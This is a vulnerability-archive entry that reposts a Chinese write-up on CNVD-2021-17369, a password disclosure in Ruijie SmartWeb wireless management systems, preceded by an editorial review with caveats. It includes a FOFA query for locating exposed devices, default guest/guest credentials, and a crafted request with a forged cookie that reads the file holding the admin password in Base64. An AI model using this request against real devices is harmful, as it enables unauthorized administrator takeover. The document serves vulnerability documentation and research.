---
cnvd: "CNVD-2021-17369"
source: "MrWQ/vulnerability-paper"
id: "vw-008058497b121e76fcf82600"
entity_id: "ve-008058497b121e76fcf82600"
schema_version: "1"
fofa_unverified: "title="
title: "锐捷 Smartweb 管理系统 密码信息泄露漏洞 CNVD-2021-17369 (1day~)"
product: "Ruijie无线SmartWeb，示例WS5302"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CNVD-2021-17369"
referenced_identifiers: ""
prerequisites: "guest/guest或低权限账号；型号/固件范围缺"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7%20Smartweb%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-17369%20%281day~%29.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/nvk4Nu8q8AxeuPDPygllWA"
source_status: "recorded"
---

# 锐捷 Smartweb 管理系统 密码信息泄露漏洞 CNVD-2021-17369 (1day~)

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie无线SmartWeb，示例WS5302
- 本文讨论：CNVD-2021-17369 webuser-auth.xml；guest默认凭据前置
- 版本、权限与配置前提：guest/guest或低权限账号；型号/固件范围缺
- 资料类型：低权凭据泄露转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Base64误称加密/解密；fofa元数据残缺
- 与387同研究简化版，没有明确匿名请求被拦的负证据
- 无补丁版本
- 已落实的文本修订：“base64 加密”改为“Base64 编码”；“解密就可以获得”改为“解码可能获得”；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 受影响设备/版本、默认guest范围和固定版本待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nvk4Nu8q8AxeuPDPygllWA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

**锐捷网络股份有限公司无线 smartweb 管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。**

**二:  漏洞影响🐇**

**锐捷网络股份有限公司 无线 smartweb 管理系统**

**三:  漏洞复现🐋**

```
FOFA: title="无线smartWeb--登录页面"
```

登录页面如下

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3MpEyfmBpzLq03e54eGXvbib8pS8bWOiaGva7L0icNoDxHgj5UxwbhcMpQ/640?wx_fmt=png)

**然后找到了一个设备存在管理 admin 员的弱口令，进去后发现 Web CLI 控制台**

**翻文件的过程中发现一个文件很有意思，运行命令查看**

```
more /web/xml/webuser-auth.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG30c4teS9LWDOnFBDfr7KRDOQzLfLFhLyXsqRia2OxCHeLcB8srjbRGjA/640?wx_fmt=png)

**里面存在所有人的账号密码**

**默认存在 guest 账户，账号密码为 **guest/guest****

**其中登录的过程中搜索 admin 的数据后发现请求了一个文件 **/web/xml/webuser-auth.xml**，而且响应中包含了 admin 密码的 Base64 编码**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG38XyyHjYJNvTFcNCrjAzrm492XBT4BOFuticQQqOxetq0qhbmibf2Emng/640?wx_fmt=png)

**解码可能获得 admin 管理员的密码，尝试直接请求**  

```
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml

Cookie添加
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3LvfiaJ0xOGYz3Q27COtibpbib6dl2jPYBfuZIBV2C4kvP1jlOiaE7UIKpA/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
Ruijie_smartweb_password_information_disclosure
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3PDfEJs8FjRdbzFqiaOTx1C9zb0BWiaRP4iaDVNN8NKxZ4OogVQaKicpbpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3vcLkH0iagWFia8GTmWYbH5cSZD4DHdSaNic73RiaHqWFkorxuKIo8dicBxA/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在交流群和公众号，想要投稿的加我一起建设文库~
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3oFxduIZusbktTovD18wqMFpp8xLtZ1ZaPOghhV1eQhyKJ7NflN8zSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3w19aTRfNYGuKWCK5UvmhXPzbS6nqklyPnPuECevR1MzdvONpgnGrZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3dHkvubfZibTpUsjs9H7Qq521dseDtibT2eBbib4F5gibDtXpTVLfKbcSYQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
